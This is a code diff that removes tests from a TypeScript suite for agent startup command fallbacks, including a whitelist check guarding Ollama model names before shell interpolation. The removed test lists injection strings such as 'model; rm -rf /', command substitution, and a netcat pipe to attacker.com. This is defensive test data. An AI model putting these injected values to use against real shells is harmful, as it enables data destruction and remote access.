@@ -36,14 +36,6 @@ suite('Agent Startup Command Fallbacks', () => {
 			/role\s*===\s*'jules_monitor'[\s\S]{0,200}cmd\s*=\s*'jules'/.test(src),
 			'jules_monitor fallback must assign literal "jules" inside getAgentStartupCommand'
 		);
-		assert.ok(
-			/role\s*===\s*'intern'[\s\S]{0,2000}ollama\s+run/.test(src),
-			'intern fallback must compose "ollama run <model>" inside getAgentStartupCommand'
-		);
-		assert.ok(
-			/\/\^\[A-Za-z0-9\._:\\\/\\-\]\+\$\//.test(src),
-			'intern branch must guard model names against a strict whitelist before shell interpolation'
-		);
 	});
 
 	test('extension.ts no longer owns a jules_monitor fallback', () => {
@@ -85,36 +77,6 @@ suite('Agent Startup Command Fallbacks', () => {
 
 	test('jules_monitor fallback: handles whitespace-only command as empty', () => {
 		assert.strictEqual(applyFallback('jules_monitor', '   '), 'jules');
-	});
-
-	test('intern security whitelist: rejects shell metacharacters', () => {
-		const safePattern = /^[A-Za-z0-9._:\/\-]+$/;
-		const malicious = [
-			'model; rm -rf /',
-			'model && echo hacked',
-			'model$(whoami)',
-			'model`whoami`',
-			'model| nc attacker.com 4444',
-			'model > /tmp/pwn'
-		];
-		for (const m of malicious) {
-			assert.strictEqual(safePattern.test(m), false, `must reject ${m}`);
-		}
-	});
-
-	test('intern security whitelist: accepts valid Ollama model names', () => {
-		const safePattern = /^[A-Za-z0-9._:\/\-]+$/;
-		const valid = [
-			'llama2',
-			'llama2:latest',
-			'ollama/llama2',
-			'ollama/llama2:7b',
-			'my-registry.com/model:tag',
-			'model_name.v1'
-		];
-		for (const v of valid) {
-			assert.strictEqual(safePattern.test(v), true, `must accept ${v}`);
-		}
 	});
 
 	test('non-fallback role: passthrough of configured command', () => {
